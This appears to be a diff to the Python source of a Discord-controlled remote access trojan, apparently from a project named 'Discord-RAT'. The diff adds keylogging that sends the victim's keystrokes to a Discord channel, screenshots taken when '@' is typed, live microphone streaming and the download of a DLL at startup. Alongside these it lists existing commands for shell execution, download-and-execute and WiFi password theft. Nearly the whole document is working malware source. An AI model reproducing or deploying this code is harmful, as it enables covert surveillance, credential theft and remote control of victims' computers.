@@ -8,6 +8,7 @@ AUTHORIZED_USERS = [YOUR_USER_ID]
 
 import discord
 from discord.ext import commands
+from discord.ext.commands import MissingRequiredArgument
 import platform
 import subprocess
 import os
@@ -31,6 +32,14 @@ import logging
 import psutil
 import datetime
 import atexit
+import pyttsx3
+import pyaudio
+import base64
+from pynput.keyboard import Key, Listener
+from PIL import ImageGrab
+import threading
+import requests
+import json
 
 admin_status_file = "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren
 
@@ -139,10 +148,11 @@ def check_single_instance():
             os.remove(pid_file)
     
     atexit.register(remove_pid_file)
-        
+
 @bot.event
 async def on_ready():
     print(f'Wir sind eingeloggt als {bot.user}')
+    bot.loop.create_task(send_messages())  # Start the send_messages function here
     guild = bot.get_guild(GUILD_ID)
     if guild:
         computer_name = platform.node()
@@ -153,6 +163,16 @@ async def on_ready():
             print(f'Channel "{sanitized_name}" wurde erstellt')
         else:
             print(f'Channel "{sanitized_name}" existiert bereits')
+            
+        load_keylogger_status()  
+        keylogger_channel_name = f"{sanitized_name}-keylogger"
+
+        # Create keylogger channel if not exists
+        keylogger_channel = await create_channel_if_not_exists(guild, keylogger_channel_name)
+        channel_ids['keylogger_channel'] = keylogger_channel.id
+        print(f"Keylogger channel ID set to: {keylogger_channel.id}")
+        
+        channel_ids['voice'] = YOUR_VOICE_CHANNEL_ID
     else:
         print('Guild nicht gefunden')
     load_admin_status()  # Laden des Admin-Status beim Start
@@ -170,24 +190,28 @@ def is_bot_or_command(message):
 @bot.command(name='help')
 async def custom_help(ctx):
     help_text = """
-    **Verfügbare Befehle:**
+    **Available Commands:**
 
-    `!ping` - Zeigt die Latenz des Bots an.
-    `!screenshot` - Macht einen Screenshot und sendet ihn.
-    `!cmd <command>` - Führt einen CMD-Befehl aus.
-    `!powershell <command>` - Führt einen PowerShell-Befehl aus.
-    `!file_upload <target_path>` - Lädt eine Datei hoch.
-    `!file_download <file_path>` - Lädt eine Datei herunter.
-    `!execute <url>` - Lädt eine Datei von der URL herunter und führt sie aus.
-    `!notify <title> <message>` - Sendet eine Benachrichtigung.
-    `!restart` - Startet den PC neu.
-    `!shutdown` - Fährt den PC herunter.
-    `!admin` - Fordert Admin-Rechte an.
-    `!stop` - Stoppt den Bot.
-    `!wifi` - Zeigt WLAN-Profile und Passwörter an.
-    `!system_info` - Zeigt Informationen über das System an.
-    `!cpu_usage` - Zeigt die aktuelle CPU-Auslastung an.
-    `!taskkill <pid>` - Beendet einen Prozess mit der angegebenen PID.
+    `!ping` - Shows the bot's latency.
+    `!screenshot` - Takes a screenshot and sends it.
+    `!cmd <command>` - Executes a CMD command.
+    `!powershell <command>` - Executes a PowerShell command.
+    `!file_upload <target_path>` - Uploads a file.
+    `!file_download <file_path>` - Downloads a file.
+    `!execute <url>` - Downloads and executes a file from the URL.
+    `!notify <title> <message>` - Sends a notification.
+    `!restart` - Restarts the PC.
+    `!shutdown` - Shuts down the PC.
+    `!admin` - Requests admin rights.
+    `!stop` - Stops the bot.
+    `!wifi` - Shows WiFi profiles and passwords.
+    `!system_info` - Shows system information.
+    `!cpu_usage` - Shows the current CPU usage.
+    `!taskkill <pid>` - Kills a process with the given PID.
+    `!tts <message>` - Plays a custom text-to-speech message.
+    `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
+    `!mic_stream_stop` - Stops the mic stream if activated.
+    `!keylog <on/off>` - Activates or deactivates keylogging.
     """
     await ctx.send(help_text)
     
@@ -623,13 +647,224 @@ async def wifi(ctx):
     except Exception as e:
         await working_message.delete()
         await send_temporary_message(ctx, f'Fehler beim Abrufen der WLAN-Profile: {str(e)}', duration=10)
-        
+
+# Function to download libopus if it doesn't exist in the temp directory
+def download_libopus():
+    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"  # Ersetzen Sie dies durch eine vertrauenswürdige Quelle
+    temp_dir = tempfile.gettempdir()
+    opuslib_path = os.path.join(temp_dir, 'libopus.dll')
+
+    if not os.path.exists(opuslib_path):
+        response = requests.get(url)
+        with open(opuslib_path, 'wb') as file:
+            file.write(response.content)
+        print(f"{opuslib_path} heruntergeladen.")
+
+    return opuslib_path
+
+# Load Opus library
+opuslib_path = download_libopus()
+discord.opus.load_opus(opuslib_path)
+
+# PyAudioPCM class for streaming audio from the microphone
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
+        p = pyaudio.PyAudio()
+        self.chunks = chunk
+        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+    def read(self) -> bytes:
+        return self.input_stream.read(self.chunks)
+
+# Bot command to join voice channel and stream microphone audio
+@bot.command()
+@commands.check(is_authorized)
+async def mic_stream_start(ctx):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
+
+    # Ensure 'voice' key exists in channel_ids
+    if 'voice' not in channel_ids:
+        await ctx.send(f"`[{current_time()}] Voice-Channel ID ist nicht gesetzt.`", delete_after=10)
+        return
+
+    voice_channel = discord.utils.get(ctx.guild.voice_channels, id=channel_ids['voice'])
+    if voice_channel is None:
+        await ctx.send(f"`[{current_time()}] Voice-Channel nicht gefunden.`", delete_after=10)
+        return
+
+    vc = await voice_channel.connect(self_deaf=True)
+    vc.play(PyAudioPCM())
+    await ctx.send(f"`[{current_time()}] Joined voice-channel and streaming microphone in realtime`")
+
+    # Log messages (you can replace these with actual logging if needed)
+    print(f"[{current_time()}] Connected to voice channel")
+    print(f"[{current_time()}] Started playing audio from microphone's input")
+
+# Bot command to leave the voice channel
+@bot.command()
+@commands.check(is_authorized)
+async def mic_stream_stop(ctx):
+    if ctx.voice_client is None:
+        await ctx.send(f"`[{current_time()}] Bot ist in keinem Voice-Channel.`", delete_after=10)
+        return
+
+    await ctx.voice_client.disconnect()
+    await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
+    
+# Global variables for keylogging
+files_to_send, messages_to_send, embeds_to_send = [], [], []
+channel_ids, text_buffor = {}, ''
+ctrl_codes = {
+    'Key.ctrl_l': 'CTRL_L',
+    'Key.ctrl_r': 'CTRL_R',
+    'Key.alt_l': 'ALT_L',
+    'Key.alt_r': 'ALT_R'
+}
+keylogger_active = False
+keylogger_thread = None
+status_file = 'keylogger_status.json'
+
+# Function to get the current time
+def current_time():
+    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+# Function to create a channel if it does not exist
+async def create_channel_if_not_exists(guild, channel_name):
+    channel = discord.utils.get(guild.channels, name=channel_name)
+    if channel is None:
+        channel = await guild.create_text_channel(channel_name)
+        print(f"Channel {channel_name} created with ID: {channel.id}")
+    else:
+        print(f"Channel {channel_name} exists with ID: {channel.id}")
+    return channel
+
+# Function to send messages to the Discord channel
+async def send_messages():
+    await bot.wait_until_ready()
+    while not bot.is_closed():
+        if messages_to_send:
+            for message in messages_to_send:
+                channel = bot.get_channel(message[0])
+                print(f"Sending message to channel ID: {message[0]}")
+                await channel.send(message[1])
+            messages_to_send.clear()
+        await asyncio.sleep(1)
+
+# Function to save keylogger status
+def save_keylogger_status():
+    global keylogger_active
+    status = {'keylogger_active': keylogger_active}
+    with open(status_file, 'w') as f:
+        json.dump(status, f)
+
+# Function to load keylogger status
+def load_keylogger_status():
+    global keylogger_active
+    if os.path.exists(status_file):
+        with open(status_file, 'r') as f:
+            status = json.load(f)
+            keylogger_active = status.get('keylogger_active', False)
+
+# Key press event handler
+def on_press(key):
+    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
+    processed_key = str(key)[1:-1] if (str(key)[0] == '\'' and str(key)[-1] == '\'') else key
+
+    keycodes = {
+        Key.space: ' ',
+        Key.shift: ' *`SHIFT`*',
+        Key.tab: ' *`TAB`*',
+        Key.backspace: ' *`<`*',
+        Key.esc: ' *`ESC`*',
+        Key.caps_lock: ' *`CAPS LOCK`*',
+        Key.f1: ' *`F1`*',
+        Key.f2: ' *`F2`*',
+        Key.f3: ' *`F3`*',
+        Key.f4: ' *`F4`*',
+        Key.f5: ' *`F5`*',
+        Key.f6: ' *`F6`*',
+        Key.f7: ' *`F7`*',
+        Key.f8: ' *`F8`*',
+        Key.f9: ' *`F9`*',
+        Key.f10: ' *`F10`*',
+        Key.f11: ' *`F11`*',
+        Key.f12: ' *`F12`*',
+    }
+    if processed_key in ctrl_codes.keys():
+        processed_key = ' `' + ctrl_codes[processed_key] + '`'
+    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
+        for i in keycodes:
+            if processed_key == i:
+                processed_key = keycodes[i]
+        if processed_key == Key.enter:
+            processed_key = ''
+            messages_to_send.append([channel_ids['keylogger_channel'], text_buffor + ' *`ENTER`*'])
+            text_buffor = ''
+        elif processed_key == Key.print_screen or processed_key == '@':
+            processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
+            ImageGrab.grab(all_screens=True).save('ss.png')
+            embeds_to_send.append([channel_ids['keylogger_channel'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
+        text_buffor += str(processed_key)
+        if len(text_buffor) > 1975:
+            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
+                messages_to_send.append([channel_ids['keylogger_channel'], text_buffor])
+            else:
+                messages_to_send.append([channel_ids['keylogger_channel'], text_buffor])
+            text_buffor = ''
+
+        # Debugging message
+        print(f"Key pressed: {processed_key}")
+
+# Function to start the keylogger
+def start_keylogger():
+    global keylogger_active
+    keylogger_active = True
+    save_keylogger_status()
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+# Function to stop the keylogger
+def stop_keylogger():
+    global keylogger_active
+    keylogger_active = False
+    save_keylogger_status()
+    # Stopping the listener automatically
+
+# Bot command to control the keylogger
+@bot.command()
+@commands.check(is_authorized)
+async def keylog(ctx, action=None):
+    global keylogger_thread, keylogger_active
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
+
+    if action == 'on':
+        if keylogger_active:
+            await log_message(ctx, '🔴 **Keylogger ist bereits aktiv.**', duration=10)
+        else:
+            keylogger_thread = threading.Thread(target=start_keylogger)
+            keylogger_thread.start()
+            await log_message(ctx, '🟢 **Keylogger wurde aktiviert.**')
+            # Debugging message
+            print("Keylogger wurde aktiviert.")
+    elif action == 'off':
+        if not keylogger_active:
+            await log_message(ctx, '🔴 **Keylogger ist bereits deaktiviert.**', duration=10)
+        else:
+            stop_keylogger()
+            await log_message(ctx, '🔴 **Keylogger wurde deaktiviert.**')
+            # Debugging message
+            print("Keylogger wurde deaktiviert.")
+    else:
+        await log_message(ctx, '❌ **Ungültige Aktion. Verwenden Sie `!keylog on` oder `!keylog off`.**', duration=10)
+
 def main():
     time.sleep(15)
     load_admin_status()
     check_single_instance()
 
 if __name__ == "__main__":
-    main()
-
+    main()  
 bot.run(TOKEN)
